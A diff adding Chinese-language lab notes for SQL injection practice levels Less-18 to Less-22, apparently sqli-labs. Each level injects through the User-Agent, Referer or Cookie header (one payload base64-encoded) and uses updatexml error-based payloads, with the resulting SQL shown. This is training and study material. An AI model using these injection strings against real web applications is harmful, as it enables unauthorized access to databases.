@@ -1025,3 +1025,103 @@ print(get_username())
 print(get_password())
 ```
 
+### Less-18
+
+需要对源码进行修改,参照Less-17
+
+登录回显发现uagent
+
+![image-20210508104239213](image-20210508104239213.png)
+
+在header中设置`User-Agent: '`回显`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '192.168.8.1', 'admin')' at line 1`
+
+推测对uagent进行了保存,保存方式为`value('$uagent','$ip','$uname')`
+
+设置header`User-Agent: ' and updatexml(1,concat(0x7e,(length(database())),0x7e),1) and '1'='1`从而构成闭合
+
+构成的sql语句为
+
+```
+INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('' and updatexml(1,concat(0x7e,(length(database())),0x7e),1) and '1'='1', '192.168.8.1', 'admin')
+```
+
+后面的注入与报错注入类似
+
+### Less-19
+
+需要对源码进行修改,参照Less-17
+
+登录回显发现referer
+
+在header中设置`Referer: '`回显`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '192.168.8.1')' at line 1`
+
+推测对uagent进行了保存,保存方式为`value('$referer','$ip')`
+
+设置header`Referer: ' and updatexml(1,concat(0x7e,(length(database())),0x7e),1) and '1'='1`从而构成闭合
+
+构成的sql语句为
+
+```
+INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('' and updatexml(1,concat(0x7e,(length(database())),0x7e),1) and '1'='1', '192.168.8.1')
+```
+
+后面的注入与报错注入类似
+
+### Less-20
+
+需要对源码进行修改,参照Less-17
+
+登录后返回
+
+```
+YOUR USER AGENT IS : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
+YOUR IP ADDRESS IS : 192.168.8.1
+DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE
+YOUR COOKIE : uname = admin and expires: Sat 08 May 2021 - 13:56:57
+Your Login name:admin
+Your Password:admin
+Your ID:8
+```
+
+在header中设置`Cookie: uname='asdf`回显`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'asdf' LIMIT 0,1' at line 1`
+
+对cookie中的uname进行了查询处理
+
+设置header`Cookie: uname=' and updatexml(1,concat(0x7e,(length(database())),0x7e),1)#`
+
+后面的注入与报错注入类似
+
+### Less-21
+
+需要对源码进行修改,参照Less-17
+
+登录后返回
+
+```
+YOUR USER AGENT IS : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
+YOUR IP ADDRESS IS : 192.168.8.1
+DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE
+YOUR COOKIE : uname = YWRtaW4= and expires: Sat 08 May 2021 - 14:09:25
+Your Login name:admin
+Your Password:admin
+Your ID:8
+```
+
+可以看到uname被base64转码
+
+在header中设置`Cookie: uname=J2FzZGY=`回显`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'asdf') LIMIT 0,1' at line 1`
+
+可知uname的查询方式为`('$uname')`
+
+对cookie中的uname进行了查询处理
+
+设置header`Cookie: uname=JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChsZW5ndGgoZGF0YWJhc2UoKSkpLDB4N2UpLDEpIw==`
+
+后面的注入与报错注入类似
+
+### Less-22
+
+需要对源码进行修改,参照Less-17
+
+与Less-21类似,把闭合方式换成`"`
+
